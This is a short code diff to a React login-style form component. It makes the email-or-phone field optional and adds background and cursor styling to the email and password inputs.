@@ -76,13 +76,13 @@ export default function FormTwo() {
               render={({ field }) => (
                 <FormItem>
                   <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
-                    Email or Phone Number
+                    Email or Phone Number (Optional)
                   </FormLabel>
                   <FormControl>
                     <Input
                       type="text"
                       placeholder="Enter email or phone number"
-                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 bg-white cursor-text"
                       {...field}
                     />
                   </FormControl>
@@ -102,7 +102,7 @@ export default function FormTwo() {
                     <Input
                       type="password"
                       placeholder="Enter password"
-                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20"
+                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 bg-white cursor-text"
                       {...field}
                     />
                   </FormControl>
